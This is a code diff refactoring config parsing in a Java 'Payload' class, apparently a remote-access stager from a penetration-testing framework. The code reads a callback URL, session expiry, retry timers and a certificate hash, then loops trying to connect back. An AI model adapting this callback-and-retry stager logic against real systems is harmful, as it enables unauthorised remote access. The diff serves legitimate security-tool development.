@@ -27,9 +27,6 @@ public class Payload {
 
 
     private static long session_expiry;
-    private static long comm_timeout;
-    private static long retry_total;
-    private static long retry_wait;
     private static byte[] cert_hash;
     private static String stageless_class;
 
@@ -59,49 +56,25 @@ public class Payload {
             String path = currentDir.getAbsolutePath();
             parameters = new Object[]{ path , configBytes };
         }
-        long sessionExpiry;
-        long commTimeout;
-        long retryTotal;
-        long retryWait;
-
         // if the first byte != 0 this is a stageless payload
         if (configBytes[0] != 0) {
             stageless_class = ConfigParser.readString(configBytes, 8000, 100);
         }
 
-        int csr = ConfigParser.SESSION_EXPIRY_START_LEN;
-        sessionExpiry = ConfigParser.unpack32(configBytes, csr);
-        csr += 4;
-        byte[] uuid = ConfigParser.readBytes(configBytes, csr, ConfigParser.UUID_LEN);
-        csr += ConfigParser.UUID_LEN;
-
-        byte[] sessionGUID = ConfigParser.readBytes(configBytes, csr, ConfigParser.GUID_LEN);
-        csr += ConfigParser.GUID_LEN;
-
-        String url = ConfigParser.readString(configBytes, csr, ConfigParser.URL_LEN);
-        csr += ConfigParser.URL_LEN;
-        commTimeout = ConfigParser.unpack32(configBytes, csr);
-        csr += 4;
-        retryTotal = ConfigParser.unpack32(configBytes, csr);
-        csr += 4;
-        retryWait = ConfigParser.unpack32(configBytes, csr);
-        csr += 4;
-        byte[] certHash = ConfigParser.readBytes(configBytes, 2192, ConfigParser.CERT_HASH_LEN);
-        for (byte hashByte : certHash) {
-            if (hashByte != 0) {
-                cert_hash = certHash;
-                break;
-            }
+        Config config = ConfigParser.parseConfig(configBytes);
+        if (config.transportConfigList.isEmpty()) {
+            return;
         }
-
+        TransportConfig transportConfig = config.transportConfigList.get(0);
+        String url = transportConfig.url;
         long currentTime = System.currentTimeMillis();
         long payloadStart = currentTime;
-        session_expiry = TimeUnit.SECONDS.toMillis(sessionExpiry) + payloadStart;
-        comm_timeout = TimeUnit.SECONDS.toMillis(commTimeout);
-        retry_total = TimeUnit.SECONDS.toMillis(retryTotal);
-        retry_wait = TimeUnit.SECONDS.toMillis(retryWait);
+        session_expiry = config.session_expiry + payloadStart;
+        long retryTotal = transportConfig.retry_total;
+        long retryWait = transportConfig.retry_wait;
+        cert_hash = transportConfig.cert_hash;
 
-        while (currentTime <= payloadStart + retry_total &&
+        while (currentTime <= payloadStart + retryTotal &&
             currentTime <= session_expiry) {
             try {
                 if (url.startsWith("tcp")) {
@@ -117,7 +90,7 @@ public class Payload {
                 // e.printStackTrace();
             }
             try {
-                Thread.sleep(retry_wait);
+                Thread.sleep(retryWait);
             } catch (InterruptedException e) {
               break;
             }
